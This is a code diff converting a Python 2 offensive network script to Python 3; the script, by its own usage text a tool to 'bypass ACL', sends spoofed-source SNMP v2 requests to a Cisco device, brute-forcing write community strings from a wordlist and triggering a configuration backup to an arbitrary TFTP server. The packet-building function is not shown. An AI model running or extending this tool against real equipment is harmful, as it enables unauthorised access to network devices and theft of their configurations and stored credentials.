@@ -1,4 +1,4 @@
-#!/usr/bin/env python
+#!/usr/bin/env python3
 # coding=utf-8   
 import os,re, sys, random
 
@@ -6,14 +6,14 @@ import os,re, sys, random
 try:
   from scapy.all import *
 except:
-  print "install scapy !"
+  print("install scapy !")
 
 # Functions
 def getparam(count):
   if len(sys.argv) != count+1:
-    print 'Fun tool to bypass ACL, Trigger a backup of a cisco from a spoofed ip'
-    print 'ACL in SNMP v2 protect nothing'
-    print 'To Use: '+ sys.argv[0]+  ' src_ip csco_ip tftp_ip [rwcommunity or filename]'
+    print('Fun tool to bypass ACL, Trigger a backup of a cisco from a spoofed ip')
+    print('ACL in SNMP v2 protect nothing')
+    print('To Use: '+ sys.argv[0]+  ' src_ip csco_ip tftp_ip [rwcommunity or filename]')
     sys.exit(1)
   else:
     return sys.argv[1], sys.argv[2], sys.argv[3], sys.argv[4]
@@ -41,17 +41,17 @@ def main():
   IP_src,IP_dst,IP_tftp,RWcommunity = getparam(4)
     
   if os.path.exists(RWcommunity):
-    print ("Getting Community from file %s" % RWcommunity) 
+    print(("Getting Community from file %s" % RWcommunity)) 
     f = open(RWcommunity,'r')
-    print 'Starting bruteforcing community'
+    print('Starting bruteforcing community')
     for RWcommunity in f.readlines():
         request(IP_src,IP_dst,IP_tftp,RWcommunity.rstrip('\n'))
-        print ".",
+        print(".", end=' ')
     f.close()
-    print '\nFinished list'
+    print('\nFinished list')
   else:
     request(IP_src,IP_dst,IP_tftp,RWcommunity)
-    print ( "Payload send from %s to %s with Community %s backup to %s" % ( IP_src, IP_dst, RWcommunity , IP_tftp ))
+    print(( "Payload send from %s to %s with Community %s backup to %s" % ( IP_src, IP_dst, RWcommunity , IP_tftp )))
 
 if __name__ == '__main__':
   main()
